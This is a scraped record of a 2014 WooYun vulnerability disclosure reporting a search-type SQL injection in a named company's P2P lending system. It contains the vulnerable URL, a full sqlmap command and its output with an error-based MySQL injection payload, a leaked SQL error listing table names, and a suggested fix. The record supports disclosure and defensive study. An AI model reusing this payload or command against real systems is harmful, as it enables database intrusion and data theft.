{"id": 1629, "wybug_id": "wooyun-2014-064035", "wybug_title": "帝友P2P借贷系统搜索型SQL注入", "wybug_corp": "厦门帝网信息科技有限公司", "wybug_author": "xlz0iza1", "wybug_date": "2014-06-08 12:01", "wybug_open_date": "2014-09-03 12:02", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-06-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-06-13：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-08-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向公众公开  简要描述： RT 详细说明：  标题上面说是v3.1版本，具体是什么版本，亲~您懂的。\nhttp://v31.diyou.cc/transfer_success/index.html?keywords=1&borrow_type=&account_status=&borrow_interestrate=&spread_month=\n注入点keywords直接带入数据库中查询/\nC:\\Python27\\sqlmap>sqlmap.py -u \"http://v31.diyou.cc/transfer_success/index.html?keywords=1&borrow_type=&account_status=&borrow_interestrate=&spread_month=\" --batch -p \"keywords\" -v 2 --current-db    sqlmap/0.9 - automatic SQL injection and database takeover tool    http://sqlmap.sourceforge.net[*] starting at: 12:03:53[12:03:53] [DEBUG] cleaning up configuration parameters[12:03:53] [DEBUG] setting the HTTP timeout[12:03:53] [DEBUG] setting the HTTP method to GET[12:03:53] [DEBUG] creating HTTP requests opener object[12:03:53] [INFO] using 'C:\\Python27\\sqlmap\\output\\v31.diyou.cc\\session' as session file[12:03:53] [INFO] resuming injection data from session file[12:03:53] [INFO] resuming back-end DBMS 'mysql 5.0' from session file[12:03:53] [INFO] testing connection to the target url[12:03:54] [WARNING] the testable parameter 'keywords' you provided is not intothe Cookiesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: keywords    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: keywords=1' AND (SELECT 7351 FROM(SELECT COUNT(*),CONCAT(CHAR(58,99,104,116,58),(SELECT (CASE WHEN (7351=7351) THEN 1 ELSE 0 END)),CHAR(58,120,112,99,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND 'iLHc'='iLHc&borrow_type=&account_status=&borrow_interestrate=&spread_month=---[12:03:54] [INFO] the back-end DBMS is MySQLweb server operating system: Linux Debian or Ubuntu 6.0 (unstable sid or testing squeeze)web application technology: PHP 5.3.3, Apache 2.2.16back-end DBMS: MySQL 5.0[12:03:54] [INFO] fetching current database[12:03:54] [INFO] retrieved: 131209_v31diyou[12:03:54] [DEBUG] performed 1 queries in 0 secondscurrent database:    '131209_v31diyou'[12:03:54] [INFO] Fetched data logged to text files under 'C:\\Python27\\sqlmap\\output\\v31.diyou.cc'[*] shutting down at: 12:03:54\n   漏洞证明：  1%27带入查询，数据库报错。\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 6执行SQL语句错误!select count(1) as num from `deayou_borrow_change` as p1 left join`deayou_borrow_tender` as p2 on p1.tender_id=p2.id left join `deayou_users` as p3 on p2.user_id=p3.user_id left join `deayou_borrow` as p4 on p2.borrow_nid=p4.borrow_nid left join `deayou_users` as p6 on p4.user_id=p6.user_id left join `deayou_users` as p5 on p1.buy_userid=p5.user_id where 1=1 and p1.status in (1) and p4.name like '%1'%'\n\n\n\n\n   修复方案：  过滤addslashes，可以参考原来dedecms那个搜索型修补。   版权声明：转载请注明来源 xlz0iza1@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-03 12:02 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-06-08 12:26 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  居然没走小厂商？    \n     2014-06-08 19:55 |    \t\tJ4nker \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:35        | I have a dream)\t\t \n  哈哈，都快二年了。才公布出来。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}